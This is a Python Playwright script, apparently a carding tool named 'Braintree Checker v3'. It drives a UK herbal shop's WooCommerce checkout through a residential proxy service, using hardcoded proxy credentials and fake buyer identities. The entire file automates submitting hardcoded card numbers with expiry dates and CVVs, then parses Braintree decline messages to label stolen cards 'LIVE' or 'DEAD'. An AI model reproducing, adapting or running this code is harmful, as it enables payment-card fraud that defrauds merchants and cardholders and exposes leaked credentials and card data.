#!/usr/bin/env python3
"""
Herbs Hands Healing - Braintree Checker v3
Fixed: Cart + Card Number + Reason Extraction
"""

from playwright.sync_api import sync_playwright
import time
import random
import json
import re

# ═══ BrightData ═══
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

# ═══ Site ═══
SITE_URL = "https://shop.herbs-hands-healing.co.uk"

# ═══ Products (رخيصة) ═══
PRODUCT_URLS = [
    f"{SITE_URL}/product/breathe-clear-herb-tea-2",
    f"{SITE_URL}/product/evening-peace-herb-tea",
    f"{SITE_URL}/product/pollitox-capsules",
]

# ═══ Cards ═══
CARDS = [
    "5104040287872188|12|2027|951",
    "5156786158125943|07|2028|829",
]

FIRST_NAMES = ["James", "John", "Robert", "Michael"]
LAST_NAMES = ["Smith", "Johnson", "Williams"]

ADDRESSES = [
    {"address": "123 Oxford Street", "city": "London", "postcode": "W1D 2HG"},
    {"address": "45 High Street", "city": "Manchester", "postcode": "M1 1AA"},
    {"address": "78 Queen Street", "city": "Birmingham", "postcode": "B1 1AA"},
]


def connect_browser(p):
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...")
    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
    print("✅ Connected\n")
    return browser


def add_to_cart_via_ajax(page):
    """أضف منتج للسلة عبر AJAX مباشرة"""
    print("🛒 Adding product to cart (AJAX)...")
    
    # WooCommerce AJAX add to cart
    product_id = "10510"  # Breathe & Clear Herb Tea ID
    
    try:
        result = page.evaluate(f"""
            async () => {{
                try {{
                    const response = await fetch('/?wc-ajax=add_to_cart', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/x-www-form-urlencoded',
                        }},
                        body: 'product_id={product_id}&quantity=1'
                    }});
                    const data = await response.json();
                    return data;
                }} catch(e) {{
                    return {{error: e.message}};
                }}
            }}
        """)
        
        print(f"   📦 AJAX response: {str(result)[:100]}")
        
        if result and not result.get('error'):
            if 'cart_hash' in result or 'fragments' in result:
                print(f"   ✅ Product added via AJAX")
                return True
        
        return False
        
    except Exception as e:
        print(f"   ❌ AJAX error: {str(e)[:100]}")
        return False


def add_to_cart(page):
    """أضف منتج للسلة"""
    print("🛒 Adding product to cart...")
    
    product_url = random.choice(PRODUCT_URLS)
    print(f"   📦 Product: {product_url.split('/')[-1]}")
    
    try:
        page.goto(product_url, timeout=60000, wait_until="domcontentloaded")
        time.sleep(5)
        
        print("   🔎 Looking for add-to-cart button...")
        
        # ═══ انتظر الزر ═══
        try:
            page.wait_for_selector("button[name='add-to-cart'], .single_add_to_cart_button", 
                                   timeout=20000)
        except:
            print("   ⚠️ Button not found, trying AJAX...")
            return add_to_cart_via_ajax(page)
        
        # ═══ اضغط الزر ═══
        add_btn_selectors = [
            "button[name='add-to-cart']",
            ".single_add_to_cart_button",
            "button.single_add_to_cart_button",
        ]
        
        added = False
        for sel in add_btn_selectors:
            try:
                btn = page.query_selector(sel)
                if btn and btn.is_visible():
                    btn.click()
                    print(f"   ✅ Clicked: {sel}")
                    added = True
                    break
            except:
                continue
        
        if not added:
            return add_to_cart_via_ajax(page)
        
        # ═══ انتظر الـ AJAX ═══
        print("   ⏳ Waiting for cart update (8s)...")
        time.sleep(8)
        
        # ═══ تحقق من السلة - بعدة طرق ═══
        cart_verified = False
        
        # طريقة 1: Header count
        try:
            count = page.evaluate("""
                () => {
                    const selectors = [
                        '.cart-contents-count',
                        '.cart-count',
                        '.header-cart-count',
                        '.cart-items-count',
                        '[class*="cart-count"]'
                    ];
                    for (const sel of selectors) {
                        const el = document.querySelector(sel);
                        if (el) {
                            const text = el.textContent.trim();
                            if (text && text !== '0') return text;
                        }
                    }
                    return '0';
                }
            """)
            
            if count != '0':
                print(f"   ✅ Cart count: {count}")
                cart_verified = True
        except:
            pass
        
        # طريقة 2: روح صفحة السلة وتأكد
        if not cart_verified:
            print("   🔎 Verifying via cart page...")
            try:
                page.goto(f"{SITE_URL}/cart", timeout=30000, wait_until="domcontentloaded")
                time.sleep(3)
                cart_body = page.inner_text("body").lower()
                
                if 'empty' not in cart_body and ('subtotal' in cart_body or 'breathe' in cart_body or 'evening' in cart_body or 'pollitox' in cart_body):
                    print(f"   ✅ Cart verified via page")
                    cart_verified = True
                else:
                    print(f"   ⚠️ Cart appears empty")
            except Exception as e:
                print(f"   ⚠️ Verify error: {str(e)[:80]}")
        
        # طريقة 3: AJAX
        if not cart_verified:
            print("   🔄 Trying AJAX add to cart...")
            if add_to_cart_via_ajax(page):
                cart_verified = True
                time.sleep(3)
        
        return cart_verified
        
    except Exception as e:
        print(f"   ❌ Add to cart error: {str(e)[:100]}")
        return False


def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
    """ملء Braintree Hosted Fields بشكل صحيح"""
    
    filled = {'card': False, 'expiry': False, 'cvv': False}
    
    # ═══ انتظر الـ iframes تحمّل ═══
    print("   ⏳ Waiting for Braintree iframes...")
    time.sleep(5)
    
    # ═══ احصل على كل الـ frames ═══
    all_frames = page.frames
    print(f"   📋 Total frames: {len(all_frames)}")
    
    # ═══ حلل كل frame ═══
    for frame in all_frames:
        frame_url = frame.url or ""
        frame_name = frame.name or ""
        
        # تخطى الـ frames اللي مش بتاعة Braintree
        if not ('braintree' in frame_url.lower() or 
                'card' in frame_name.lower() or
                'number' in frame_name.lower() or
                'cvv' in frame_name.lower() or
                'expiration' in frame_name.lower() or
                'hosted' in frame_url.lower() or
                'hosted' in frame_name.lower()):
            continue
        
        print(f"   🎯 Braintree frame: name={frame_name[:30]}, url={frame_url[:60]}")
        
        # ═══ Card Number ═══
        if not filled['card']:
            for sel in [
                "input[name='number']",
                "input[name='card-number']",
                "input[autocomplete='cc-number']",
                "input[data-braintree-name='number']",
                "input[type='tel']",
                "input[type='text']",
            ]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(num, delay=random.randint(50, 100))
                        filled['card'] = True
                        print(f"   ✅ Card number (via {sel})")
                        break
                except:
                    continue
        
        # ═══ Expiry ═══
        if not filled['expiry']:
            for sel in [
                "input[name='expirationDate']",
                "input[name='expiration']",
                "input[name='expiration-date']",
                "input[autocomplete='cc-exp']",
                "input[data-braintree-name='expirationDate']",
            ]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(f"{mm}{yy[2:]}", delay=random.randint(50, 100))
                        filled['expiry'] = True
                        print(f"   ✅ Expiry (via {sel})")
                        break
                except:
                    continue
        
        # ═══ CVV ═══
        if not filled['cvv']:
            for sel in [
                "input[name='cvv']",
                "input[name='cvv-field']",
                "input[autocomplete='cc-csc']",
                "input[data-braintree-name='cvv']",
            ]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(cvv, delay=random.randint(50, 100))
                        filled['cvv'] = True
                        print(f"   ✅ CVV (via {sel})")
                        break
                except:
                    continue
        
        if all(filled.values()):
            break
    
    # ═══ لو Card Number ما اتكتبش، جرب كل الـ frames ═══
    if not filled['card']:
        print("   🔄 Trying all frames for card number...")
        for frame in all_frames:
            try:
                # جرب أي input ظاهر
                inputs = frame.query_selector_all("input")
                for inp in inputs:
                    try:
                        if inp.is_visible():
                            # شوف لو input ده لسه فاضي، واكتب فيه الرقم
                            current_val = inp.input_value()
                            if not current_val or len(current_val) < 3:
                                inp.click()
                                time.sleep(0.3)
                                inp.type(num, delay=50)
                                filled['card'] = True
                                print(f"   ✅ Card number (blind fill)")
                                break
                    except:
                        continue
                if filled['card']:
                    break
            except:
                continue
    
    return filled


def extract_reason(page_text):
    """استخراج سبب الرفض من HTML"""
    
    # ═══ Patterns ═══
    patterns = [
        (r"Reason:\s*Declined\s*-\s*Call\s*Issuer", "DECLINED_CALL_ISSUER"),
        (r"Reason:\s*Do\s*Not\s*Honor", "DO_NOT_HONOR"),
        (r"Reason:\s*Insufficient\s*Funds", "INSUFFICIENT_FUNDS"),
        (r"Reason:\s*Expired\s*Card", "EXPIRED_CARD"),
        (r"Reason:\s*Invalid\s*Credit\s*Card\s*Number", "INVALID_CARD"),
        (r"Reason:\s*CVV", "CVV_INVALID"),
        (r"Reason:\s*Processor\s*Declined", "DECLINED"),
        (r"Reason:\s*Card\s*reported\s*as\s*lost", "LOST_STOLEN"),
        (r"Reason:\s*Restricted\s*Card", "RESTRICTED_CARD"),
        (r"Reason:\s*Suspected\s*Fraud", "SUSPECTED_FRAUD"),
        (r"Reason:\s*Transaction\s*Not\s*Allowed", "NOT_ALLOWED"),
        (r"Reason:\s*Invalid\s*Transaction", "INVALID_TXN"),
        (r"Reason:\s*Violation", "VIOLATION"),
        # Fallback: أي Reason
        (r"Reason:\s*([^\n<]+)", "DECLINED"),
    ]
    
    for pattern, code in patterns:
        m = re.search(pattern, page_text, re.IGNORECASE)
        if m:
            full = m.group(0).strip()
            return code, full
    
    # ═══ Success check ═══
    if 'thank you' in page_text.lower() and 'order' in page_text.lower():
        return "CHARGE $1", "Order placed successfully"
    
    return None, None


def check_card(browser, card, idx, total):
    """فحص بطاقة واحدة"""
    t0 = time.time()
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        return "INVALID_FORMAT", "Bad format", 0
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    print(f"{'═'*60}")
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}")
    print(f"{'═'*60}")
    
    context = None
    try:
        context = browser.new_context(
            viewport={"width": 1366, "height": 900},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        # Intercept
        page.add_init_script("""
            window.__all_responses = [];
            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({url, status: response.status, body});
                } catch(e) {}
                return response;
            };
        """)
        
        # ═══ Step 1: Add to cart ═══
        print("📄 [1/8] Adding product to cart...")
        if not add_to_cart(page):
            print("   ❌ Failed to add to cart")
            try:
                context.close()
            except:
                pass
            return "NO_CART", "Could not add to cart", round(time.time() - t0, 1)
        
        # ═══ Step 2: Go to checkout ═══
        print("📄 [2/8] Going to checkout...")
        page.goto(f"{SITE_URL}/checkout", timeout=90000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # ═══ Step 3: Cloudflare ═══
        print("🛡️  [3/8] Waiting for Cloudflare...")
        for i in range(30):
            title = page.title()
            if "checking" in title.lower() or "just a moment" in title.lower():
                time.sleep(1)
            else:
                print(f"   ✅ Title: {title[:60]}")
                break
        
        # ═══ Step 4: Wait for form ═══
        print("📝 [4/8] Waiting for form...")
        try:
            page.wait_for_selector("#billing_first_name", timeout=30000)
            print("   ✅ Form visible")
        except:
            print("   ⚠️ Form not found")
            try:
                html = page.content()
                with open(f"debug_checkout_{idx}.html", "w") as f:
                    f.write(html)
            except:
                pass
            try:
                context.close()
            except:
                pass
            return "NO_FORM", "Form not loaded", round(time.time() - t0, 1)
        
        # ═══ Step 5: Fill billing ═══
        print("📝 [5/8] Filling billing...")
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
        ad = random.choice(ADDRESSES)
        
        try:
            page.fill("#billing_first_name", f)
            page.fill("#billing_last_name", l)
            page.fill("#billing_address_1", ad["address"])
            page.fill("#billing_city", ad["city"])
            page.fill("#billing_postcode", ad["postcode"])
            page.fill("#billing_phone", "07123456789")
            page.fill("#billing_email", em)
            print(f"   ✅ Filled ({f} {l})")
        except Exception as e:
            print(f"   ⚠️ {str(e)[:100]}")
        
        time.sleep(1)
        
        # ═══ Step 6: Fill card ═══
        print("💳 [6/8] Filling card...")
        
        fill_result = fill_braintree_hosted_fields(page, num, mm, yy, cvv)
        
        print(f"   📊 Card fill result: {fill_result}")
        
        if not all(fill_result.values()):
            print(f"   ⚠️ Card fill incomplete")
        
        time.sleep(1)
        
        # ═══ Step 7: Accept terms + Place order ═══
        print("👆 [7/8] Placing order...")
        
        # Accept terms
        try:
            terms = page.query_selector("#terms")
            if terms and not terms.is_checked():
                terms.check()
                print("   ✅ Terms checked")
        except:
            try:
                page.click("label[for='terms']")
                print("   ✅ Terms clicked")
            except:
                print("   ⚠️ Terms not found")
        
        # GDPR
        try:
            gdpr = page.query_selector("#gdpr_woo_consent")
            if gdpr and not gdpr.is_checked():
                gdpr.check()
                print("   ✅ GDPR checked")
        except:
            pass
        
        time.sleep(1)
        
        # Place order
        try:
            page.click("#place_order")
            print("   ✅ Clicked Place Order")
        except:
            try:
                page.click("button[name='woocommerce_checkout_place_order']")
                print("   ✅ Clicked (alt)")
            except:
                print("   ⚠️ Could not click")
        
        # ═══ Step 8: Wait for response ═══
        print("⏳ [8/8] Waiting for response...")
        result_code = "UNKNOWN"
        result_text = ""
        
        for i in range(40):
            time.sleep(1)
            
            # ═══ FIRST: HTML extraction ═══
            try:
                page_text = page.inner_text("body")
                code, text = extract_reason(page_text)
                if code:
                    result_code = code
                    result_text = text
                    print(f"   🎯 Found: {text}")
                    break
            except:
                pass
            
            # ═══ SECOND: API responses ═══
            try:
                responses = page.evaluate("() => window.__all_responses || []")
                for r in reversed(responses):
                    url = r.get('url', '')
                    body = r.get('body', '')
                    
                    if any(x in url for x in ['.js', '.css', '.png', '.jpg']):
                        continue
                    
                    # WooCommerce checkout
                    if 'wc-ajax=checkout' in url:
                        try:
                            data = json.loads(body)
                            
                            if data.get('result') == 'success':
                                result_code = "CHARGE $1"
                                result_text = data.get('redirect', 'Success')
                                break
                            elif data.get('result') == 'failure':
                                messages = str(data.get('messages', ''))
                                # Extract Reason
                                m = re.search(r'Reason:\s*([^\n<]+)', messages)
                                if m:
                                    reason = m.group(1).strip()
                                    result_text = reason
                                    
                                    r_low = reason.lower()
                                    if 'call issuer' in r_low:
                                        result_code = "DECLINED_CALL_ISSUER"
                                    elif 'insufficient' in r_low:
                                        result_code = "INSUFFICIENT_FUNDS"
                                    elif 'do not honor' in r_low:
                                        result_code = "DO_NOT_HONOR"
                                    elif 'expired' in r_low:
                                        result_code = "EXPIRED_CARD"
                                    elif 'invalid' in r_low:
                                        result_code = "INVALID_CARD"
                                    elif 'cvv' in r_low:
                                        result_code = "CVV_INVALID"
                                    else:
                                        result_code = "DECLINED"
                                break
                        except:
                            pass
                    
                    # Braintree
                    if 'braintree' in url.lower():
                        try:
                            data = json.loads(body)
                            if 'errors' in data:
                                errors = data['errors']
                                if errors:
                                    ext = errors[0].get('extensions', {})
                                    error_code = ext.get('errorCode', '')
                                    error_msg = errors[0].get('message', '')
                                    result_code = error_code or "DECLINED"
                                    result_text = error_msg[:200]
                                    break
                        except:
                            pass
                
                if result_code != "UNKNOWN":
                    break
            except:
                pass
            
            if (i + 1) % 5 == 0:
                print(f"   ⏳ {i+1}s...")
        
        # Save HTML
        try:
            html = page.content()
            with open(f"result_{idx}.html", "w") as f:
                f.write(html)
            print(f"   💾 Saved result_{idx}.html")
        except:
            pass
        
        try:
            context.close()
        except:
            pass
        
    except Exception as e:
        print(f"❌ Error: {str(e)[:150]}")
        result_code = f"ERR: {str(e)[:60]}"
        result_text = str(e)[:100]
        if context:
            try:
                context.close()
            except:
                pass
    
    elapsed = round(time.time() - t0, 1)
    print(f"\n📝 {result_code}")
    if result_text:
        print(f"   💬 {result_text}")
    print(f"⏱️  {elapsed}s\n")
    
    return result_code, result_text, elapsed


def main():
    print("=" * 60)
    print("  🌿 Herbs Hands Healing - v3 (Fixed)")
    print("  🚀 BrightData Scraping Browser")
    print("=" * 60)
    print(f"\n  💳 Cards: {len(CARDS)}\n")
    
    with sync_playwright() as p:
        browser = connect_browser(p)
        
        results = []
        for idx, card in enumerate(CARDS, 1):
            try:
                code, text, elapsed = check_card(browser, card, idx, len(CARDS))
            except Exception as e:
                code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
            
            results.append({
                'card': card,
                'code': code,
                'text': text,
                'elapsed': elapsed,
            })
            
            if idx < len(CARDS):
                delay = random.uniform(10, 15)
                print(f"⏸️  Waiting {delay:.1f}s...\n")
                time.sleep(delay)
        
        try:
            browser.close()
        except:
            pass
    
    # ═══ Summary ═══
    print("=" * 60)
    print("📊 النتائج النهائية")
    print("=" * 60)
    
    # ═══ التصنيف الجديد الصح ═══
    live_codes = [
        'INSUFFICIENT_FUNDS',       # ✅ Live
        'DECLINED_CALL_ISSUER',     # ✅ Live ← ده اللي كنا بنشوفه
        'DO_NOT_HONOR',             # ✅ Live
        'DECLINED',                 # ✅ Live
        'SUSPECTED_FRAUD',          # ✅ Live
        'RESTRICTED_CARD',          # ✅ Live
        'NOT_ALLOWED',              # ✅ Live
        'STOPPED_BILLING',          # ✅ Live
        'CHARGE $1',                # ✅ CHARGE
        'TOKENIZED',                # ✅ Card valid
        'VIOLATION',                # ✅ Live
    ]
    
    dead_codes = [
        'INVALID_CARD',
        'INVALID_CARD_NUMBER',
        'EXPIRED_CARD',
        'CVV_INVALID',
        'LOST_STOLEN',
        'INVALID_TXN',
        'INVALID_FORMAT',
    ]
    
    live_count = 0
    dead_count = 0
    error_count = 0
    
    for r in results:
        code = r['code']
        
        if code == 'CHARGE $1':
            status = "🔥🔥 CHARGE"
            live_count += 1
        elif code in live_codes:
            status = "🔥 LIVE"
            live_count += 1
        elif code in dead_codes:
            status = "❌ DEAD"
            dead_count += 1
        elif code.startswith('ERR') or code in ['NO_FORM', 'NO_CART', 'UNKNOWN', 'FILL_FAILED']:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❓ UNKNOWN"
            error_count += 1
        
        print(f"\n💳 {r['card']}")
        print(f"   📝 {r['code']}")
        if r['text']:
            print(f"   💬 {r['text']}")
        print(f"   {status} | ⏱️ {r['elapsed']}s")
    
    print(f"\n{'='*60}")
    print(f"🔥 Live:   {live_count}")
    print(f"❌ Dead:   {dead_count}")
    print(f"⚠️  Errors: {error_count}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
